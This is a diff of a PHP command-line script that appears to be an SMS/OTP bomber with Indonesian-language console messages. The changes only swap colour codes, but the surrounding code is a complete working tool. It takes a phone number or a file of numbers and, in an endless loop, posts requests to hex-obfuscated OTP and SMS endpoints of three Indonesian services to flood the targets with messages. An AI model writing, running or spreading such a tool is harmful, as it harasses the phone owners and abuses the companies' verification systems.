@@ -12,9 +12,6 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
     $X  = "";
     $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';
 } else {
-    $R  = "color a";
-    $RR = "color c";
-    $G  = "color b";
     $GG = "\e[92;7m";
     $B  = "\e[36m";
     $BB = "\e[36;7m";
@@ -51,28 +48,28 @@ function post_data($url,$data) {
 	return curl_exec($ch);
 	curl_close($ch);
 	}
-isset($argv[1]) OR die($RR."[!] []== Nomor nya mana bgsd ==[] [!]\n".$X);
+isset($argv[1]) OR die($GG."[!] []== Nomor nya mana bgsd ==[] [!]\n".$X);
 if(is_numeric($argv[1])) {
-	echo "[]OTW LUR[] #".$G.$argv[1].$X."\n";
+	echo "[]OTW LUR[] #".$GG.$argv[1].$X."\n";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");
 	while(1) {
-		echo "[]LAGI NGIRIM NI BGSD[] # ".$G.$argv[1].$X."\n";	
+		echo "[]LAGI NGIRIM NI BGSD[] # ".$GG.$argv[1].$X."\n";	
 		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");
 		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);
 	}
 }
 if(!file_exists($argv[1])) {
-	die($RR."[!] File Not Exists [!]".$X."\n");
+	die($BB."[!] File Not Exists [!]".$X."\n");
 }
 $argv[1]=explode("\n",file_get_contents($argv[1]));
 $argv[1]=str_replace(' ','',$argv[1]);
 foreach($argv[1] as $argv[2]):
-echo "[]OTW LUR[] #".$G.$argv[2].$X."\n";
+echo "[]OTW LUR[] #".$GG.$argv[2].$X."\n";
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");
 endforeach;
 while(1) {
 foreach($argv[1] as $argv[2]):
-echo "[]LAGI NGIRIM BGSD[] # ".$G.$argv[2].$X."\n";
+echo "[]LAGI NGIRIM BGSD[] # ".$GG.$argv[2].$X."\n";
 	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");
 	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);
 endforeach;
